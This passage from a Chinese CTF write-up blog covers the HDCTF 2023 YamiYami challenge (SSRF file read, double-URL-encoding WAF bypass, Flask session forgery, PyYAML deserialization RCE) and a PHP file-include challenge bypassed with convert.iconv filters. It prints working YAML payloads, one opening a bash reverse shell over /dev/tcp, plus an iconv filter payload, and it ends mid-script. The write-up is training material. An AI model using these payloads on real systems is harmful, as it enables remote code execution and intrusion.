class="string">&#x27;/admin&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>])</span><br><span class="line">def <span class="built_in">admin_can_list_root</span>():</span><br><span class="line">    if session.<span class="built_in">get</span>(<span class="string">&#x27;admin&#x27;</span>) == <span class="number">1</span>:</span><br><span class="line">        return flag</span><br><span class="line">    <span class="attribute">else</span>:</span><br><span class="line">        session[<span class="string">&#x27;admin&#x27;</span>] = <span class="number">0</span></span><br><span class="line">        return <span class="string">&quot;NoNoNo&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.<span class="built_in">run</span>(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=False, port=<span class="number">5637</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></code></pre></li></ol><p>首先要得到<code>secret_key</code>andom指定了seed那么生成的随机数是固定的看一下<a href="https://so.csdn.net/so/search?q=uuid&amp;spm=1001.2101.3001.7020">uuid</a>.getnode()的作用</p><p><img src="https://gitee.com/eviden/img/raw/master/image-20240611223937587.png" alt="image-20240611223937587"></p><p>那我们可以通过读取当前的mac地址从而得到secret_key/sys/class/net/eth0/address 获得mac地址</p><p>当然也可以通过爆破所有的物理地址并且一个个看</p><blockquote><p>[<a href="https://www.nssctf.cn/problem/3780">HDCTF 2023]YamiYami | NSSCTF</a></p></blockquote><p>开题先不管,<code>f12</code>打开先</p><p><img src="https://gitee.com/eviden/img/raw/master/202406142131527.png" alt="image-20240614213148359"></p><p>发现有东西!</p><p><code>pwd</code>下提示为/app,<code>upload</code>是一个文件上传页面<code>read</code>当然就是文件读取了,它默认指向百度,ssrf探测内网文件.</p><p><img src="https://gitee.com/eviden/img/raw/master/202406142133322.png" alt="image-20240614213358240"></p><p>正常读<code>/etc/passwd</code>,ok本地文件泄露</p><p>老套路,<code>/proc/self/cmdline</code>，用于获取当前启动进程的完整命令。</p><p><img src="https://gitee.com/eviden/img/raw/master/202406142135567.png" alt="image-20240614213508520"></p><p>尝试直接读源码:遇到waf过滤了</p><p><img src="https://gitee.com/eviden/img/raw/master/202406142140588.png" alt="image-20240614214020542"></p><p><strong>这里学到用双重url编码绕过正则解析url.</strong></p><p>参看大佬题解的说法</p><ol><li>接下来是最tricky的一点了, <code>urllib.request.urlopen</code> 可以直接接受urlencode的路径, 但是读本地文件时最前面的 <code>/</code> 要保留, 不能编码为 <code>%2F</code></li></ol><p><img src="https://gitee.com/eviden/img/raw/master/202406142144418.png" alt="image-20240614214426356"></p><p><img src="https://gitee.com/eviden/img/raw/master/202406142155353.png" alt="image-20240614215549288"></p><p><img src="https://gitee.com/eviden/img/raw/master/202406142155101.png" alt="image-20240614215558058"></p><p>测试后发现确实如此,而且还说明一个很重要的问题就是这个urlopen()是可以接受url编码后的地址.</p><p><strong>为啥二次编码?</strong></p><p><code>因为浏览器默认一次编码,意思就是你编码一次其实无所谓,你传上去还是你之前写的老东西,二次编码的目的就是要后端真正解析到的是我们一次url编码得到的字符串,以此达到绕过waf的目的</code></p><p>ok道理说清楚我们可以开始读文件了.结果还是符合预期的.</p><p><img src="https://gitee.com/eviden/img/raw/master/202406142159230.png" alt="image-20240614215924115"></p><p>GPT一键恢复大法:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8 </span></span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> uuid </span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line"></span><br><span class="line">app = Flask(__name__) </span><br><span class="line">random.seed(uuid.getnode()) </span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random()*<span class="number">233</span>) </span><br><span class="line">app.debug = <span class="literal">False</span> </span><br><span class="line">BLACK_LIST=[<span class="string">&quot;yaml&quot;</span>,<span class="string">&quot;YAML&quot;</span>,<span class="string">&quot;YML&quot;</span>,<span class="string">&quot;yml&quot;</span>,<span class="string">&quot;yamiyami&quot;</span>] </span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="string">&quot;/app/uploads&quot;</span> </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(): </span><br><span class="line">    session[<span class="string">&#x27;passport&#x27;</span>] = <span class="string">&#x27;YamiYami&#x27;</span> </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27; Welcome to HDCTF2023 </span></span><br><span class="line"><span class="string">    Read somethings </span></span><br><span class="line"><span class="string">    Here is the challenge Upload file </span></span><br><span class="line"><span class="string">    Enjoy it pwd &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/pwd&#x27;</span></span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwd</span>(): </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(pwdpath) </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span></span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(): </span><br><span class="line">    <span class="keyword">try</span>: </span><br><span class="line">        url = request.args.get(<span class="string">&#x27;url&#x27;</span>) </span><br><span class="line">        m = re.findall(<span class="string">&#x27;app.*&#x27;</span>, url, re.IGNORECASE) </span><br><span class="line">        n = re.findall(<span class="string">&#x27;flag&#x27;</span>, url, re.IGNORECASE) </span><br><span class="line">        <span class="keyword">if</span> m: </span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;re.findall(&#x27;app.*&#x27;, url, re.IGNORECASE)&quot;</span> </span><br><span class="line">        <span class="keyword">if</span> n: </span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;re.findall(&#x27;flag&#x27;, url, re.IGNORECASE)&quot;</span> </span><br><span class="line">        res = urlopen(url) </span><br><span class="line">        <span class="keyword">return</span> res.read() </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex: </span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(ex)) </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;no response&#x27;</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allowed_file</span>(<span class="params">filename</span>): </span><br><span class="line">    <span class="keyword">for</span> blackstr <span class="keyword">in</span> BLACK_LIST: </span><br><span class="line">        <span class="keyword">if</span> blackstr <span class="keyword">in</span> filename: </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span> </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span> </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>(): </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>: </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files: </span><br><span class="line">            flash(<span class="string">&#x27;No file part&#x27;</span>) </span><br><span class="line">            <span class="keyword">return</span> redirect(request.url) </span><br><span class="line">        file = request.files[<span class="string">&#x27;file&#x27;</span>] </span><br><span class="line">        <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>: </span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Empty file&quot;</span> </span><br><span class="line">        <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename): </span><br><span class="line">            filename = secure_filename(file.filename) </span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&#x27;./uploads/&#x27;</span>): </span><br><span class="line">                os.makedirs(<span class="string">&#x27;./uploads/&#x27;</span>) </span><br><span class="line">            file.save(os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)) </span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;upload successfully!&quot;</span> </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>) </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/boogipop&#x27;</span></span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>(): </span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&quot;passport&quot;</span>) == <span class="string">&quot;Welcome To HDCTF2023&quot;</span>: </span><br><span class="line">        LoadedFile = request.args.get(<span class="string">&quot;file&quot;</span>) </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(LoadedFile): </span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;file not exists&quot;</span> </span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(LoadedFile) <span class="keyword">as</span> f: </span><br><span class="line">            yaml.full_load(f) </span><br><span class="line">        f.close() </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;van you see&quot;</span> </span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Auth bro&quot;</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>: </span><br><span class="line">    pwdpath = os.popen(<span class="string">&quot;pwd&quot;</span>).read() </span><br><span class="line">    app.run(debug=<span class="literal">False</span>, host=<span class="string">&quot;0.0.0.0&quot;</span>) </span><br><span class="line">    <span class="built_in">print</span>(app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>代码审计:</p><blockquote><p>之前题目3个url提示应该是有文件上传功能的.首先抓它文件上传了个什么玩意<br>app.config[‘UPLOAD_FOLDER’] = “/app/uploads”</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename): </span><br><span class="line">    filename = secure_filename(file.filename) </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&#x27;./uploads/&#x27;</span>): </span><br><span class="line">        os.makedirs(<span class="string">&#x27;./uploads/&#x27;</span>) </span><br><span class="line">    file.save(os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)) </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;upload successfully!&quot;</span> </span><br></pre></td></tr></table></figure><blockquote><p>然后后面还写了个文件读取的功能</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/boogipop&#x27;</span></span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>(): </span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&quot;passport&quot;</span>) == <span class="string">&quot;Welcome To HDCTF2023&quot;</span>: </span><br><span class="line">        LoadedFile = request.args.get(<span class="string">&quot;file&quot;</span>) </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(LoadedFile): </span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;file not exists&quot;</span> </span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(LoadedFile) <span class="keyword">as</span> f: </span><br><span class="line">            yaml.full_load(f) </span><br><span class="line">        f.close() </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;van you see&quot;</span> </span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Auth bro&quot;</span> </span><br><span class="line"><span class="comment"># 老演员了,flask Session 伪造       </span></span><br><span class="line">random.seed(uuid.getnode()) </span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random()*<span class="number">233</span>) </span><br><span class="line"><span class="comment">#验证完身份后它会执行</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(LoadedFile) <span class="keyword">as</span> f: </span><br><span class="line">            yaml.full_load(f) </span><br><span class="line"><span class="comment">#第一次接触这个,python的yaml反序列化漏洞</span></span><br><span class="line"><span class="comment">#不过这还有个黑名单</span></span><br><span class="line">BLACK_LIST=[<span class="string">&quot;yaml&quot;</span>,<span class="string">&quot;YAML&quot;</span>,<span class="string">&quot;YML&quot;</span>,<span class="string">&quot;yml&quot;</span>,<span class="string">&quot;yamiyami&quot;</span>] </span><br><span class="line"><span class="comment">#上传文件的时候要注意点</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>反序列化yaml上传文件写法</p><p>1.不反弹shell直接读,但是他这不能回显,所以通过重定向到一个文件,再通过我们之前的任意文件读取该文件的内容</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!python/object/new:str</span></span><br><span class="line">  <span class="attr">args:</span> []</span><br><span class="line">  <span class="attr">state:</span> <span class="type">!!python/tuple</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;cat /proc/1/cmdline &gt; /tmp/1.txt&#x27;)&quot;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="type">!!python/object/new:staticmethod</span></span><br><span class="line">      <span class="attr">args:</span> []</span><br><span class="line">      <span class="attr">state:</span></span><br><span class="line">        <span class="attr">update:</span> <span class="type">!!python/name:eval</span></span><br><span class="line">        <span class="attr">items:</span> <span class="type">!!python/name:list</span></span><br></pre></td></tr></table></figure><p>2.反弹shell,一步到位,<code>日穿!</code></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!python/object/new:str</span></span><br><span class="line">    <span class="attr">args:</span> []</span><br><span class="line">    <span class="attr">state:</span> <span class="type">!!python/tuple</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/ip/port &lt;&amp;1\&quot;&#x27;)&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="type">!!python/object/new:staticmethod</span></span><br><span class="line">        <span class="attr">args:</span> []</span><br><span class="line">        <span class="attr">state:</span></span><br><span class="line">          <span class="attr">update:</span> <span class="type">!!python/name:eval</span></span><br><span class="line">          <span class="attr">items:</span> <span class="type">!!python/name:list</span></span><br></pre></td></tr></table></figure><p>然后访问url<code>http://node2.anna.nssctf.cn:28809/boogipop?file</code>,执行yaml文件反序列化,造成rce即可</p><p>这里有个问题:</p><p>用bp的时候,我发现浏览器的session不会刷新的!</p><p><img src="https://gitee.com/eviden/img/raw/master/202406142243795.png" alt="image-20240614224325677"></p><p>硬控我半小时了,艹!</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>6-9做题记录</title>
      <link href="/posts/87a3a3ea.html"/>
      <url>/posts/87a3a3ea.html</url>
      
        <content type="html"><![CDATA[<blockquote><h1>攻防世界web-file_include(江苏工匠杯/泰山杯原题)</h1></blockquote><p>关键:<code>convert.iconv* 绕过</code></p><p>源码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;./check.php&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>伪协议读取文件,但waf将<code>php://filter/read=convert.base64-encode/resource=index.php</code>中某些关键词过滤了,因此要绕过!</p><p><img src="https://gitee.com/eviden/img/raw/master/image-20240609110641816.png" alt="image-20240609110641816"></p><p><img src="https://gitee.com/eviden/img/raw/master/image-20240609110714891.png" alt="image-20240609110714891"></p><p>最终fuzz得到是过滤了php这个过滤器以及<code>string</code>关键字.</p><p>这导致我们常规的伪协议无法读取文件</p><h5 id="利用-convert-iconv">利用 convert.iconv.*</h5><p>这个过滤器需要<code>php</code>支持 <code>iconv</code> ，而<code>iconv</code>是默认编译的。使用<code>convert.iconv.*</code>过滤器等同于用<code>iconv()</code>函数处理所有的流数据。</p><p>具体可看php官方给出的编码种类.<a href="https://www.php.net/manual/en/mbstring.supported-encodings.php">PHP： 支持的字符编码 - 手册</a></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">UCS</span>-<span class="number">4</span>*</span><br><span class="line"><span class="attribute">UCS</span>-<span class="number">4</span>BE</span><br><span class="line"><span class="attribute">UCS</span>-<span class="number">4</span>LE*</span><br><span class="line"><span class="attribute">UCS</span>-<span class="number">2</span></span><br><span class="line"><span class="attribute">UCS</span>-<span class="number">2</span>BE</span><br><span class="line"><span class="attribute">UCS</span>-<span class="number">2</span>LE</span><br><span class="line"><span class="attribute">UTF</span>-<span class="number">32</span>*</span><br><span class="line"><span class="attribute">UTF</span>-<span class="number">32</span>BE*</span><br><span class="line"><span class="attribute">UTF</span>-<span class="number">32</span>LE*</span><br><span class="line"><span class="attribute">UTF</span>-<span class="number">16</span>*</span><br><span class="line"><span class="attribute">UTF</span>-<span class="number">16</span>BE*</span><br><span class="line"><span class="attribute">UTF</span>-<span class="number">16</span>LE*</span><br><span class="line"><span class="attribute">UTF</span>-<span class="number">7</span></span><br><span class="line"><span class="attribute">UTF7</span>-IMAP</span><br><span class="line"><span class="attribute">UTF</span>-<span class="number">8</span>*</span><br><span class="line"><span class="attribute">ASCII</span>*</span><br><span class="line"><span class="attribute">EUC</span>-JP*</span><br><span class="line"><span class="attribute">SJIS</span>*</span><br><span class="line"><span class="attribute">eucJP</span>-win*</span><br><span class="line"><span class="attribute">SJIS</span>-win*</span><br><span class="line"><span class="attribute">ISO</span>-<span class="number">2022</span>-JP</span><br><span class="line"><span class="attribute">ISO</span>-<span class="number">2022</span>-JP-MS</span><br><span class="line"><span class="attribute">CP932</span></span><br><span class="line"><span class="attribute">CP51932</span></span><br><span class="line"><span class="attribute">BASE64</span></span><br></pre></td></tr></table></figure><p>convery.iconv.*的使用有两种方法:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt; </span><br><span class="line"><span class="keyword">or</span> </span><br><span class="line">convert.iconv.&lt;input-encoding&gt;/&lt;output-encoding&gt;</span><br></pre></td></tr></table></figure><p>最终payload:<code>http://61.147.171.105:52243/?filename=php://filter//convert.iconv.SJIS*.UCS-4LE*/resource=flag.php</code></p><p>最后看看waf怎么写的,以后留着有用!</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//文件包含waf</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&quot;filename&quot;</span>]) &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&quot;filename&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&quot;/base|be|encode|print|zlib|quoted|write|rot13|read|string/i&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>, <span class="variable">$filename</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;do not hack!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line">flag=<span class="string">&#x27;&#x27;&#x27;&#x27;                                                                                                                                           </span></span><br><span class="line"><span class="string">       @@@@ @@  @@   @@@@   @@@@  @@@@@  @@@@  @@@@  @@@@ @@@@@ @@  @@  @@     </span></span><br><span class="line"><span class="string">      @@@@@ @@  @@  @@@@@  @@@@@  @@@@@ @@@@@ @@@@@ @@@@@ @@@@@ @@  @@  @@     </span></span><br><span class="line"><span class="string">      @@    @@  @@ @@@    @@@     @@    @@    @@    @@    @@    @@  @@  @@     </span></span><br><span class="line"><span class="string">      @@@@  @@  @@ @@     @@      @@@@@ @@@@  @@@@  @@@@  @@@@@ @@  @@  @@     </span></span><br><span class="line"><span class="string">       @@@@ @@  @@ @@     @@      @@@@@  @@@@  @@@@  @@@@ @@@@@ @@  @@  @@     </span></span><br><span class="line"><span class="string">         @@ @@  @@ @@@    @@@     @@       @@    @@    @@ @@    @@  @@  @@     </span></span><br><span class="line"><span class="string">      @@@@@ @@@@@@  @@@@@  @@@@@  @@@@@ @@@@@ @@@@@ @@@@@ @@    @@@@@@  @@@@   </span></span><br><span class="line"><span class="string">      @@@@   @@@@    @@@@   @@@@  @@@@@ @@@@  @@@@  @@@@  @@     @@@@   @@@@   </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">charsets = [</span><br><span class="line">    <span class="string">&quot;UCS-4*&quot;</span>,</span><br><span class="line">    <span class="string">&quot;UCS-4BE&quot;</span>,</span><br><span class="line">    <span class="string">&quot;UCS-4LE*&quot;</span>,</span><br><span class="line">    <span class="string">&quot;UCS-2&quot;</span>,</span><br><span class="line">    <span class="string">&quot;UCS-2BE&quot;</span>,</span><br><span class="line">    <span class="string">&quot;UCS-2LE&quot;</span>,</span><br><span class="line">    <span class="string">&quot;UTF-32*&quot;</span>,</span><br><span class="line">    <span class="string">&quot;UTF-32BE*&quot;</span>,</span><br><span class="line">    <span class="string">&quot;UTF-32LE*&quot;</span>,</span><br><span class="line">    <span class="string">&quot;UTF-16*&quot;</span>,</span><br><span class="line">    <span class="string">&quot;UTF-16BE*&quot;</span>,</span><br><span class="line">    <span class="string">&quot;UTF-16LE*&quot;</span>,</span><br><span class="line">    <span class="string">&quot;UTF-7&quot;</span>,</span><br><span class="line">    <span class="string">&quot;UTF7-IMAP&quot;</span>,</span><br><span class="line">    <span class="string">&quot;UTF-8*&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ASCII*&quot;</span>,</span><br><span class="line">    <span class="string">&quot;EUC-JP*&quot;</span>,</span><br><span class="line">    <span class="string">&quot;SJIS*&quot;</span>,</span><br><span class="line">    <span class="string">&quot;eucJP-win*&quot;</span>,</span><br><span class="line">    <span class="string">&quot;SJIS-win*&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ISO-2022-JP&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ISO-2022-JP-MS&quot;</span>,</span><br><span class="line">    <span class="string">&quot;CP932&quot;</span>,</span><br><span class="line">    <span class="string">&quot;CP51932&quot;</span>,</span><br><span class="line">    <span class="string">&quot;BASE64&quot;</span></span><br><span class="line">]</span><br><span class="line"><span class="comment"># 创建解析器</span></span><br><span class="line">parser = 